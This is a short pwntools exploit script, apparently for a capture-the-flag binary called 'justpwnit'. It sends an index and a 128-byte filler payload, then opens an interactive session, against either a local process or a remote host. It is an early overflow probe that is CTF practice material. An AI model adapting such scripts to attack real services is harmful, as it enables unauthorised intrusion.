#!/usr/bin/env python3

import sys
from pwn import *

TARGET = './justpwnit'
HOST = 'localhost'
PORT = 80

def exploit(io, elf):
    pause()
    io.sendlineafter(b'Index: ', b'1')
    io.sendlineafter(b'Data: ', b'a'*0x80)

    io.interactive()

if __name__=="__main__":
    elf = None
    if TARGET:
        elf = ELF(TARGET)

    if len(sys.argv) > 1:
        LOCAL = False
        io = remote(HOST, PORT)
        exploit(io, elf)
    elif elf:
        io = elf.process()
        exploit(io, elf)
    else:
        log.info('No local elf available.')

